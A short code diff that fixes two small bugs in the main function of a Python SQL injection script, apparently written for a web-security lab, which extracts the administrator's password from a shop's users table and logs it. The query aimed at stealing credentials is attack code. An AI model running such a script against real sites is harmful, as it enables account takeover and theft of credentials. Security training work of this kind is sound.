@@ -55,7 +55,7 @@ class MySQLi(SQLi):
           
 
 def main(args):
-    sess = requests.Session()
+    session = requests.Session()
     shop = Shop(args.url, args.no_proxy, session)
     log.info("Getting tracking id and session tocen.")
     if args.no_proxy:
@@ -69,7 +69,7 @@ def main(args):
     password = sqli.get_response_string(
         "SELECT password from users where username = 'administrator'",
         shop.base_url,
-        shop,no_proxy,
+        shop.no_proxy,
         10,
     )
     log.info(f"Received password: {password}")
